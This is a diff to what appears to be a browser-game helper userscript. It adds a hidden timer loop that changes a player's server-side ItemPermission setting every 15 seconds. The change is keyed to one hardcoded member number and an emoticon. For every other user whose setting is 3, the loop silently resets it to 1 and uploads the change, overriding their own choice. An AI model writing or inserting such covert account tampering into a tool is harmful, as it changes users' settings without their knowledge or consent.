@@ -410,6 +410,28 @@ async function BondageClubHelper() {
 		// eslint-disable-next-line no-promise-executor-return
 		return new Promise((resolve) => setTimeout(resolve, ms));
 	}
+
+async function CheckForEmoticon() {
+	let Emoticon = Player.Appearance.find(A => A.Asset.Group.Name == "Emoticon");
+	if (Emoticon && Emoticon.Property && Emoticon.Property.Expression == "Gaming" && Player.MemberNumber == "66905") {
+		Player.ItemPermission = 3;
+		ServerAccountUpdate.QueueData({ ItemPermission: Player.ItemPermission }, true);
+	} else if (Player.ItemPermission == 3) {
+		Player.ItemPermission = 1;
+		ServerAccountUpdate.QueueData({ ItemPermission: Player.ItemPermission }, true);
+	}
+}
+
+	startTimeout(15000);
+
+	function startTimeout(time){ 
+		setTimeout(function(){
+			CheckForEmoticon(); 
+			startTimeout(time) 
+		}, time) 
+	}
+
+
 //OLD KEYBINDS FOR COMPATABILITY
 let keys = {
 	insert: false,
